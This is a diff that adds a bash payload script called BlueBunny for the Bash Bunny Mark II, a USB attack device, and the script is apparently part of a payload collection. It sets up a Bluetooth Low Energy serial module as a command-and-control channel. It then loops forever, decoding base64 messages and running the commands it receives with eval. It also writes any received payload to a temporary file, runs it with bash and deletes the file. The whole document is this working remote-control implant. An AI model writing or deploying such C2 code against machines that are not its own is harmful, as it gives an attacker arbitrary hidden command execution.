@@ -1,0 +1,63 @@
+#!/bin/bash
+#
+# Title:         BlueBunny
+# Description:   BLE based C2 server for the Bash Bunny Mark II
+# Author:        90N45
+# Version:       1.0
+# Category:      Remote
+# Attackmodes:   NONE (Custom)
+
+LED SETUP
+
+# Enable serial BLE module
+stty -F /dev/ttyS1 speed 115200 cs8 -cstopb -parenb -echo -ixon -icanon -opost
+stty -F /dev/ttyS1 speed 115200 cs8 -cstopb -parenb -echo -ixon -icanon -opost
+sleep 1
+
+# Configure BLE module as slave
+echo -n -e "AT+ROLE=0" > /dev/ttyS1
+echo -n -e "AT+NAME=BlueBunny" > /dev/ttyS1
+echo -n -e "AT+ADV=1" > /dev/ttyS1
+echo -n -e "AT+RESET" > /dev/ttyS1
+
+LED FINISH
+
+while [[ true ]]; do
+	# Get incomming data from serial port
+	data=$(head -1 /dev/ttyS1)
+
+	# Decode base64 encoded data
+	data=$(echo ${data} | base64 -d)
+
+	# Echo data for debugging
+	echo "Debugger: ${data}"
+
+	# Single command
+	if [[ $data =~ "<CMD>" ]]; then
+		# Extract command
+		command=${data#*<CMD>}
+		command=${command%%<CMD>*}
+
+		# Run recieved command
+		eval "${command}"
+	fi
+
+	# Payload file
+	if [[ $data =~ "<PAYLOAD>" ]]; then
+		# Set payload file name
+		file="BlueBunnyPayload-${RANDOM}.txt"
+
+		# Extract file content
+		content=${data#*<PAYLOAD>}
+		content=${content%%<PAYLOAD>*}
+
+		# Write content to file
+		printf "${content}" > "${file}";
+
+		# Run payload
+		bash $file
+
+		# Remove payload file
+		rm $file
+	fi
+done
